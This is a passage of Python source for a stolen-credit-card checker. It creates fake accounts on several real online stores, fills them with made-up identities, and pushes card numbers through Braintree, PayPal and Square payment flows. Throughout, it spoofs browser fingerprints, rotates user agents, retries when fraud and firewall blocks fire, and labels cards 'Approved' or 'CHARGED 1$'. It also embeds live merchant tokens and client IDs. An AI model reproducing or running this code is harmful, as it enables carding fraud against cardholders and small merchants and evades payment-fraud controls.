	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'e1636f23-9ffd-4a20-b820-03fa00946fa5',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for varp in varps:
			up(varp)
	headers = {'user-agent': user}
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"65fe3af4644aa52e01ad1293199d2ee2","fraud_merchant_id":null,"correlation_id":"3964e5d466be3c8d7910ccacb2a56fbe"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/3mb8h3sxxp33t264/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/3mb8h3sxxp33t264"},"merchantId":"3mb8h3sxxp33t264","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"3mb8h3sxxp33t264","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"BIGBATTERY, INC.","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTU3ODIxNzEsImp0aSI6ImRhMzIyMjZlLTY4NmItNDliNy1iNzhjLTdmYzk4M2UzNWI0YiIsInN1YiI6IjNtYjhoM3N4eHAzM3QyNjQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjNtYjhoM3N4eHAzM3QyNjQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.iIQlR8O-0GFGD8Df2fTcfaUYAV7vwjzGa_9NFX9fBnsQitKPJUL9ZiU_9zvaCZxrbhZiSrMZjl4q19Zp_be2fw","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"BIGBATTERY, INC.","clientId":"AXJEj2OlIX6JG4HQc37tL8Qd5LwRQiUbhTyoXtJHKQkMrAc98q9QeGoNREbAMa6ONQkyQ8BOVfPSq7yJ","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bigbatteryinc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post(
	    'https://bigbattery.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	else:
		result=text
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
		
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
	elif 'risk_threshold' in text:
		return "RISK: Retry this BIN later."
	elif 'Please wait for 20 seconds' in text:
		return "RISK: Retry this BIN later."
	else:
		for varp in varps:
			up(varp)
		return "RISK: Retry this BIN later."
def pp(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	
	if len(mm) == 1:
		mm = f'0{mm}'
	
	if "20" in yy:
		yy = yy.split("20")[1]	
	import requests, re, base64, random, string, time
	from fake_useragent import UserAgent
	ua = UserAgent()
	user = ua.random
	r = requests.session()
	
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	import random
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
	    
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    return first_name, last_name
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())	
	files = {
	    'wpc_name_your_price': (None, '1.00'),
	    'quantity': (None, '1'),
	    'add-to-cart': (None, '4744'),
	}
	multipart_data = MultipartEncoder(fields=files)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': multipart_data.content_type,
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	response = r.post('https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data)
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/cart/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
	
	
	sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
	
	
	nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
	
	
	check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
	
	
	create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))
	
	
	
	
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://switchupcb.com',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-save-checkout-form',
	}
	
	json_data = {
	    'nonce': nonce,
	    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+09%3A31%3A57&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
	}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	
	
	headers = {
	    'authority': 'switchupcb.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://switchupcb.com',
	    'pragma': 'no-cache',
	    'referer': 'https://switchupcb.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	}
	
	params = {
	    'wc-ajax': 'ppc-create-order',
	}
	
	json_data = {
	    'nonce': create,
	    'payer': None,
	    'bn_code': 'Woo_PPCP',
	    'context': 'checkout',
	    'order_id': '0',
	    'payment_method': 'ppcp-gateway',
	    'funding_source': 'card',
	    'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
	    'createaccount': False,
	    'save_payment_method': False,
	}
	
	response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	
	
	
	
	id = response.json()['data']['id']
	pcp = response.json()['data']['custom_id']
	
	
	
	import random
	import string
	
	
	lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
	
	lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	
	random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
	
	
	session_id = f'uid_{lol1}_{lol3}'
	
	
	button_session_id = f'uid_{lol2}_{lol3}'
	
	
	headers = {
	    'authority': 'www.paypal.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	params = {
	    'sessionID': session_id,
	    'buttonSessionID': button_session_id,
	    'locale.x': 'en_US',
	    'commit': 'true',
	    'env': 'production',
	    'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWZZZXVDajkyc2JQUFRMMkZ1WXI4Tl91bGZWUkVjT21aTmo4UVdqSEVvUWRTZXJUVWlJdlV3cTNrOEJzSkUtZVFJU0l2WG8zTnZSNU5CRU8mY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMi0wMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxtZXNzYWdlcyZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZnRmdHdjZGxubnpydWtjdWNvZm5mamVneGJxa256In19',
	    'disable-card': '',
	    'token': id,
	}
	
	response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)
	
	
	
	
	import requests

	import random
	import string
	
	def generate_random_code():
	    characters = string.ascii_letters + string.digits
	    code = ''.join(random.choices(characters, k=17))
	    return code
	
	random_code = generate_random_code()
	
	
	headers = {
	    'authority': 'www.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://www.paypal.com',
	    'user-agent': user,
	    'x-app-name': 'standardcardfields',
	    'x-country': 'US',
	}
	
	json_data = {
	    'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
	    'variables': {
	        'token': id,
	        'card': {
	            'cardNumber': n,
	            'expirationDate': mm+'/20'+yy,
	            'postalCode': zip_code,
	            'securityCode': cvc,
	        },
	        'firstName': first_name,
	        'lastName': last_name,
	        'billingAddress': {
	            'givenName': first_name,
	            'familyName': last_name,
	            'line1': street_address,
	            'line2': None,
	            'city': city,
	            'state': state,
	            'postalCode': zip_code,
	            'country': 'US',
	        },
	        'email': acc,
	        'currencyConversionType': 'PAYPAL',
	    },
	    'operationName': None,
	}
	
	response = requests.post(
	    'https://www.paypal.com/graphql?fetch_credit_form_submit',
	    headers=headers,
	    json=json_data,
	)
	
	
	last = response.text	
	if ('ADD_SHIPPING_ERROR' in last or
	    'NEED_CREDIT_CARD' in last or
	    '"status": "succeeded"' in last or
	    'Thank You For Donation.' in last or
	    'Your payment has already been processed' in last or
	    'Success ' in last or
	    '"type":"one-time"' in last or
	    '/donations/thank_you?donation_number=' in last):
		result = "CHARGED 1$"
	elif 'is3DSecureRequired' in last:
		result = "OTP"
	elif 'OAS_VALIDATION_ERROR' in last or 'INVALID_BILLING_ADDRESS' in last:
		result = "Insufficient Funds"
	else:
		message = response.json()['errors'][0]['message']
		code = response.json()['errors'][0]['data'][0]['code']
		result = f'{message} ({code})'
	return (result)
def gg(card):
	gg=br(card)
	if 'success' in gg:
		return "Payment Successful"
	elif 'Insufficient funds in account' in gg:
		return "Insufficient funds in account"
	else:
		return "Your card couldn't be added"
def sq(card):
	import requests, re, time, uuid, json, secrets, string, random, base64
	from fake_useragent import UserAgent
	card = card.strip()
	parts = re.split('[|:]', card)
	n = parts[0]
	mm = int(parts[1]) 
	yy = parts[2] 
	cvc = parts[3]
	time.sleep(5)
	with open('files.txt', 'r') as file:
		first_line = file.readline()
	if card in first_line:
		return 'Approved'
	if len(yy) == 2:  
		yy = '20' + yy  
	yy = int(yy)
	ua = UserAgent()
	user = ua.random
	sess = str(uuid.uuid4())
	random_variable = uuid.uuid4().hex

	r = requests.Session()
	def generate_random_account():
					
		name = ''.join(random.choices(string.ascii_lowercase, k=10))
		number = ''.join(random.choices(string.digits, k=10))
		return f"{name}{number}@gmail.com"
					
	acc = (generate_random_account())

	token = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(80))	
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'none',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://redwoodhempfarm.com/my-account/', headers=headers)	
	nonce = (re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1))
	def generate_random_account():			
		name = ''.join(random.choices(string.ascii_lowercase, k=10))			
		number = ''.join(random.choices(string.digits, k=10))			
		return f"{name}{number}@gmail.com"			
	acc = (generate_random_account())
	name = ''.join(random.choices(string.ascii_lowercase, k=10))		
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://redwoodhempfarm.com',
		'referer': 'https://redwoodhempfarm.com/my-account/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	data = {
    'username': name,
    'email': acc,
    'password': 'mgdrtvcdsr',
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_session_entry': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-05-05 23:54:09',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'register': 'Register',
}

	response = r.post('https://redwoodhempfarm.com/my-account/', headers=headers, data=data)
	
	headers = {
		'authority': 'redwoodhempfarm.com',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'cache-control': 'max-age=0',
		'referer': 'https://redwoodhempfarm.com/my-account/add-payment-method/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'document',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-site': 'same-origin',
		'sec-fetch-user': '?1',
		'upgrade-insecure-requests': '1',
		'user-agent': user,
	}
	
	response = r.get('https://redwoodhempfarm.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	add_nonce = (re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1))
	application_id = (re.search(r'"application_id":"(.*?)"', response.text).group(1))
	location_id = (re.search(r'"location_id":"(.*?)"', response.text).group(1))
	headers = {
		'authority': 'pci-connect.squareup.com',
		'accept': 'application/json',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json; charset=utf-8',
		'origin': 'https://web.squarecdn.com',
		'referer': 'https://web.squarecdn.com/',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}
	params = {
		'applicationId': application_id,
		'hostname': 'redwoodhempfarm.com',
		'locationId': location_id,
		'version': '1.54.6',
	}
	response = r.get('https://pci-connect.squareup.com/payments/hydrate', params=params, headers=headers)
	lol = user
	sessionId = (response.json()['sessionId'])
	headers = {
	    'authority': 'pci-connect.squareup.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/json; charset=utf-8',
	    # 'cookie': '_savt=e8c8852d-a9ee-4066-96a9-72e09507eab1; __cf_bm=NAldStg8TC.vZybXaTeaCiS1dWNKCoUYTNH1Q7BYByg-1714953286-1.0.1.1-PhXdVQ96B4jXlUlTfQYlaVDEkEG1sTLZfgq2_xFG.XKv8UDU6YrdEIeTUR6OzgRLUHiRjZN1ipxOro_K0tGbcQ',
	    'origin': 'https://web.squarecdn.com',
	    'referer': 'https://web.squarecdn.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	params = {
	    '_': '1714953315593.5608',
	    'version': '1.55.1',
	}
	
	json_data = {
	    'client_id': application_id,
	    'location_id': location_id,
	    'payment_method_tracking_id': sess,
	    'session_id': sessionId,
	    'website_url': 'redwoodhempfarm.com',
	    'analytics_token': token,
	    'card_data': {
	        'billing_postal_code': '57255',
	        'cvv': cvc,
	        'exp_month': mm,
	        'exp_year': yy,
	        'number': n,
	    },
	}
	
	response = r.post(
	    'https://pci-connect.squareup.com/v2/card-nonce',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    json=json_data,
	)
	cnon = (response.json()['card_nonce'])
	headers = {
		'authority': 'connect.squareup.com',
		'accept': '*/*',
		'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
		'content-type': 'application/json',
		'origin': 'https://connect.squareup.com',
		'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fredwoodhempfarm.com%2Fmy-account%2Fadd-payment-method%2F',
		'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': user,
	}
	
	json_data = {
		'browser_fingerprint_by_version': [
			{
				'payload_json': '{"components":{"user_agent":"'+lol+'","language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"db9863dc7f896661f366c859cadbaf09"}',
				'payload_type': 'fingerprint-v1',
			},
			{
				'payload_json': '{"components":{"language":"ar-AE","color_depth":24,"resolution":[892,412],"available_resolution":[892,412],"timezone_offset":-120,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Linux armv81","do_not_track":"unknown","regular_plugins":[],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[5,true,true],"js_fonts":["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]},"fingerprint":"c14cd05beab4e88696247c07be01a6dc"}',
				'payload_type': 'fingerprint-v1-sans-ua',
			},
		],
		'browser_profile': {
